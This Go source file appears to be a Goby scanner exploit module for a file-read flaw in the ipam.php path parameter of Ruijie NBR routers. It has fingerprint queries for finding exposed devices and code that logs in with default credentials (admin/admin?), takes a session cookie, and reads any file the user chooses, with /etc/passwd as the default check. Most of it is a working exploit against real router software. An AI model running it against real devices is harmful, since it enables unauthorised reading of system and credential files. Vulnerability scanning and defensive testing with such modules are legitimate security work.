package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Ruijie NBR Router ipam.php File path Parameter File Read Vulnerability",
    "Description": "<p>Ruijie NBR router is a router produced by Ruijie Networks.</p><p>There is a file reading vulnerability in the path parameter of the Ruijie NBR router's ipam.php file. An attacker can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be extremely unsafe. state.</p>",
    "Product": "Ruijie-NBR-Router",
    "Homepage": "https://www.ruijie.com.cn/",
    "DisclosureDate": "2023-02-22",
    "Author": "715827922@qq.com",
    "FofaQuery": " body=\"Ruijie - NBR\" || (body=\"support.ruijie.com.cn\" && body=\"<p>系统负荷过高，导致网络拥塞，建议降低系统负荷或重启路由器\") || body=\"class=\\\"line resource\\\" id=\\\"nbr_1\\\"\" || title=\"锐捷网络 --NBR路由器--登录界面\" || title==\"锐捷网络\"",
    "GobyQuery": " body=\"Ruijie - NBR\" || (body=\"support.ruijie.com.cn\" && body=\"<p>系统负荷过高，导致网络拥塞，建议降低系统负荷或重启路由器\") || body=\"class=\\\"line resource\\\" id=\\\"nbr_1\\\"\" || title=\"锐捷网络 --NBR路由器--登录界面\" || title==\"锐捷网络\"",
    "Level": "2",
    "Impact": "<p>There is a file reading vulnerability in the path parameter of the Ruijie NBR router's ipam.php file. An attacker can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be extremely unsafe. state.</p>",
    "Recommendation": "<p>1. The official has fixed the vulnerability, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://www.ruijie.com.cn/\">https://www.ruijie.com.cn/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "filePath",
            "show": ""
        },
        {
            "name": "filePath",
            "type": "input",
            "value": "/etc/passwd",
            "show": "attackType=filePath"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": [
                "session|lastheader|regex|"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.2",
    "Translation": {
        "CN": {
            "Name": "锐捷 NBR 路由器 ipam.php 文件 path 参数文件读取漏洞",
            "Product": "Ruijie-NBR路由器",
            "Description": "<p>锐捷 NBR 路由器是一款锐捷网络旗下的路由器。</p><p>锐捷 NBR 路由器 ipam.php 文件 path 参数存在文件读取漏洞，攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。</p>",
            "Recommendation": "<p>1、官方已修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.ruijie.com.cn/\">https://www.ruijie.com.cn/</a><br></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>锐捷 NBR 路由器 ipam.php 文件 path 参数存在文件读取漏洞，攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Ruijie NBR Router ipam.php File path Parameter File Read Vulnerability",
            "Product": "Ruijie-NBR-Router",
            "Description": "<p>Ruijie NBR router is a router produced by Ruijie Networks.</p><p>There is a file reading vulnerability in the path parameter of the Ruijie NBR router's ipam.php file. An attacker can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be extremely unsafe. state.</p>",
            "Recommendation": "<p>1. The official has fixed the vulnerability, please pay attention to the manufacturer's homepage update:<br></p><p><a href=\"https://www.ruijie.com.cn/\">https://www.ruijie.com.cn/</a><br></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>There is a file reading vulnerability in the path parameter of the Ruijie NBR router's ipam.php file. An attacker can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be extremely unsafe. state.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-10-12",
    "PocId": "10852"
}`

	loginFlagf2c1fhf1 := func(hostInfo *httpclient.FixUrl) (string, error) {
		loginRequestConfig := httpclient.NewPostRequestConfig(`/ddi/server/login.php`)
		loginRequestConfig.Data = "username=admin&password=admin?"
		loginRequestConfig.VerifyTls = false
		loginRequestConfig.FollowRedirect = false
		loginRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		resp, err := httpclient.DoHttpRequest(hostInfo, loginRequestConfig)
		if err != nil {
			return "", err
		}
		for _, cookie := range resp.Cookies() {
			if "RUIJIEID" == cookie.Name {
				return cookie.Value, err
			}
		}
		return "", errors.New("漏洞利用失败")
	}

	readFileFlagf2c1fhf1 := func(hostInfo *httpclient.FixUrl, filePath string) (*httpclient.HttpResponse, error) {
		cookie, err := loginFlagf2c1fhf1(hostInfo)
		if err != nil {
			return nil, err
		}
		sendConfig := httpclient.NewPostRequestConfig("/ddi/server/ipam.php?a=getIpamJson")
		sendConfig.VerifyTls = false
		sendConfig.FollowRedirect = false
		sendConfig.Data = "path=" + filePath + "&"
		sendConfig.Header.Store("Cookie", "RUIJIEID="+cookie+"; user=admin")
		sendConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		return httpclient.DoHttpRequest(hostInfo, sendConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, singleScanConfig *scanconfig.SingleScanConfig) bool {
			resp, _ := readFileFlagf2c1fhf1(hostInfo, `/etc/passwd`)
			return resp != nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, "root:/:/bin/sh")
		},
		func(expResult *jsonvul.ExploitResult, singleScanConfig *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(singleScanConfig.Params["attackType"])
			if attackType == "filePath" {
				resp, err := readFileFlagf2c1fhf1(expResult.HostInfo, goutils.B2S(singleScanConfig.Params["filePath"]))
				if err != nil {
					expResult.Output = err.Error()
				} else if resp.StatusCode == 200 && resp.RawBody != "" {
					expResult.Success = true
					expResult.Output = resp.RawBody
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else {
				expResult.OutputType = "未知的利用方式"
				return expResult
			}
			return expResult
		},
	))
}
